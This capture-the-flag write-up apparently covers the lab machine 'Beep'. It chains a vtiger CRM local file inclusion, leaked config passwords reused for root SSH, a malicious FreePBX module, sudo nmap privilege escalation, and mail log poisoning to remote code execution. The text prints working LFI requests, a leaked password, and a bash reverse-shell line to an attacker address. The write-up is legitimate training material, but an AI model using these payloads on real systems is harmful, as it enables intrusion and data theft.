That's a lot to work through. Let's start with the web server

### Examine Port 80 - Apache httpd 2.2.3

Accessing the webserver via the browser, we see a login form.

![](pics/website.png)

As we have no idea what the username and password might be, let's first enumerate the webserver to see if there is any helpful information. For that we can use a tool such as `gobuster`.

```

## Exploitation

Testing each of those directories, reveals one very interesting one:

![](pics/vvtiger.png)

vtiger CRM (Version 5.1.0) is an open source customer-relationship management tool, that's based on PHP and MySQL.
Googling for that specific version show that it has several vulnerabilities amongst others an LFI (https://www.exploit-db.com/exploits/18770).

So let's try that:

```
https://10.129.1.226/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00


root:x:0:0:root:/root:/bin/bash 
bin:x:1:1:bin:/bin:/sbin/nologin 
...
fanis:x:501:501::/home/fanis:/bin/bash 
```

It's working! We now know that there is a user called fanis. Using the LFI we can try to obtain the userflag

```
https://10.129.1.226/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../home/fanis/user.txt%00

aea082e5ae690372196d0ebee91146c8 
```

Unfortunately, we cannot obtain the root flag, as the hijacked user apparently does not have enough privileges.

Doing more research on the LFI possibilities for this specific software, I stumbled upon this exploit here (https://www.exploit-db.com/exploits/37637). It basically says, we can leak a specific config file called `/etc/amportal.conf`. It should contain passwords, usernames as well as any other setting of the software.

And indeed! We can leak it and get tons of information.

![](pics/config.png) 

The ridiculous thing here is that they apparently use the same password `jEhdIekWmdjE` for every single user and sub-application like the mysql DB.

Now let's try to login into the admin panel in `/admin`, which we could not access previously. This time it works (username= admin)!

![](pics/admin_panel.png)

### SSH

At this point I was curious if they used the password for EVERYTHING. So I tried to connect to ssh with root! And it worked! I got a root shell! 

```

elastix-pr-2.2-1.i386.rpm  postnochroot
install.log		   root.txt
[root@beep ~]# 
```

### FreePBX

However, I was not quite satisfied with the way how I got root. So maybe there is another way to somehow get a reverse shell, now that we have access to the admin panel.

As the admin panel provides the feature for uploading custom modules, I tried to exploit this, by uploading a malicious module containing a reverse shell. And it worked! (credits to: https://github.com/SamSepiolProxy/FreePBX-Reverse-Shell-Module, which basically provided the module. Due to newer version of the FreePBX software, some changes regarding version had to be made. E.g version tags had to be added in the module.xml file and the tar.gz also had to contain the version number in the name)

```

As user `asterisk`, we can execute several commands with sudo privileges! From my experience, I immediately recognized the nmap command. It can be exploited to obtain root privileges by spawning a shell in interactive mode. If you are not familiar with those commands and want to know which one can be epxloited to escalate your privileges, you can use https://gtfobins.github.io/.

```
sh-3.2$ sudo nmap --interactive

```

### Local File Inclusion to Remote Code Execution
When I read some other writeups, I was fascinated by the fact that there exist several ways to pwn the machine. Another way I stumbled upon exploited LFI. As I am a big fan of LFIs I also had to try this one.


So again we go back to our LFI vulnerability:
```
GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

From the ennumeration part, we know that Port 25 (SMTP) is open. Let's it to send a mail to the user `asterisk`, which we leaked from the /etc/passwd file.

```
└──╼ $ telnet 10.129.1.226 25

.

quit

Connection closed by foreign host.
```

Afterwards we can check if the email was successfully sent and received:

```
GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../var/mail/asterisk%00
```

With the LFI, we can leak the email that we have just sent. This also means, that our PHP code now gets executed!

```
From babbadeckl@pwn.com  Wed Jan 13 22:48:18 2021
Return-Path: <babbadeckl@pwn.com>
X-Original-To: asterisk@localhost

Date: Wed, 13 Jan 2021 22:47:17 +0200 (EET)
From: babbadeckl@pwn.com
To: undisclosed-recipients:;
```

Now when we append our malicious parameter `babbadeckl`, that we included in the injected PHP code, we have RCE:

```
GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../var/mail/asterisk%00&babbadeckl=id


Date: Wed, 13 Jan 2021 22:47:17 +0200 (EET)
From: babbadeckl@pwn.com
To: undisclosed-recipients:;

uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
```

Let's spawn a reverse shell!

```
module_name=../../../../../../../../var/mail/asterisk%00&babbadeckl=bash+-i+>%26+/dev/tcp/10.10.14.50/4444+0>%261
```

And we get a shell! Now simply follow the steps from above to obtain root privileges (sudo nmap).

```

bash: no job control in this shell
bash-3.2$ id

```


## Post Exploitation

We can now obtain the root flag:

```
[root@beep ~]# cat root.txt
78284bce7c9d0b21378ac5bd69ee89c9
```
